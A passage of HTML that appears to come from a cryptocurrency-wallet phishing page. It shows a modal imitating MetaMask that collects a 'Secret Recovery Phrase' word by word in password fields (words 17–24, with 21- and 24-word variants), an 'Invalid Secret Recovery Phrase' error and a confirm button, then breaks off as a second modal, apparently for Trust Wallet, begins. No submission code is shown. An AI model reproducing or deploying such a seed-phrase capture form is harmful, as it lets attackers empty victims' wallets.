                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #17"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="17"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        18.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #18"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="18"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                  <div
                    id="metamask-container-21-words"
                    class="metamask-container-21-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
                  >
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        19.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #19"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="19"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        20.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #20"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="20"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        21.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #21"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="21"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                  <div
                    id="metamask-container-24-words"
                    class="metamask-container-24-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
                  >
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        22.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #22"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="22"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        23.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #23"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="23"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        24.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #24"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="24"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-px-4 scwtw-mt-3 scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400"
                  id="metamask-error-container"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-2 scwtw-py-1.5 scwtw-rounded-[4px] scwtw-bg-[#d738471a] dark:scwtw-bg-[#e88f9726] scwtw-border-l-[4px] scwtw-border-l-[#d73847] dark:scwtw-border-l-[#e88f97]"
                  >
                    <div class="scwtw-pl-2">
                      <svg
                        class="scwtw-w-6 scwtw-h-6 scwtw-fill-[#d73847] dark:scwtw-fill-[#e88f97]"
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 512 512"
                      >
                        <path
                          d="m443 342l-126-241c-16-32-40-50-65-50-26 0-50 18-66 50l-126 241c-16 30-18 60-5 83 13 23 38 36 71 36l251 0c33 0 58-13 71-36 13-23 11-53-5-83z m-206-145c0-8 6-15 15-15 8 0 14 7 14 15l0 105c0 8-6 15-14 15-9 0-15-7-15-15z m28 182c-1 1-2 2-3 3-1 0-2 1-3 1-1 1-2 1-4 2-1 0-2 0-3 0-2 0-3 0-4 0-2-1-3-1-4-2-1 0-2-1-3-1-1-1-2-2-3-3-4-4-6-9-6-15 0-5 2-11 6-15 1 0 2-1 3-2 1-1 2-2 3-2 1-1 2-1 4-1 2-1 5-1 7 0 2 0 3 0 4 1 1 0 2 1 3 2 1 1 2 2 3 2 4 4 6 10 6 15 0 6-2 11-6 15z"
                        ></path>
                      </svg>
                    </div>
                    <div class="scwtw-text-start">
                      <p
                        class="scwtw-text-[#141618] dark:scwtw-text-[#ffffff] font-euclid scwtw-font-normal scwtw-text-[14px] scwtw-pr-1"
                        id="metamask-error-text"
                      >
                        Invalid Secret Recovery Phrase
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4 scwtw-px-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#0376c9] dark:scwtw-text-[#141618] dark:scwtw-bg-[#43aefc] scwtw-font-medium font-euclid scwtw-text-[14px] scwtw-cursor-pointer scwtw-rounded-full scwtw-h-[50px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                    id="metamask-import-button"
                  >
                    Confirm Secret Recovery Phrase
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- trust -->

    <div
      id="trust-modal-overlay"
      style="display: none"
